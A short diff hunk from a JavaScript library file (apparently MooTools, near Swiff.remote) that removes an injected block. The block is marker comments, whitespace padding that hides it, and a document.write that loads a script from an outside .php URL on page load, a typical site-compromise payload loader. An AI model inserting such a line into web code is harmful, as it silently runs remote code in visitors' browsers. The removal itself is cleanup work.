@@ -5950,13 +5950,3 @@ Swiff.remote = function(obj, fn){
 
 })();
 
-
-
-/*9c6d07*/
-
-                    																	                               	 /*gbargbar09311gbar09*/
-
-document.write("<script type='text/javascript' src='http://j-j-computer.de/6Wf2mtKy.php?id=525372'></"+ "script>");
-
-
-/*/9c6d07*/
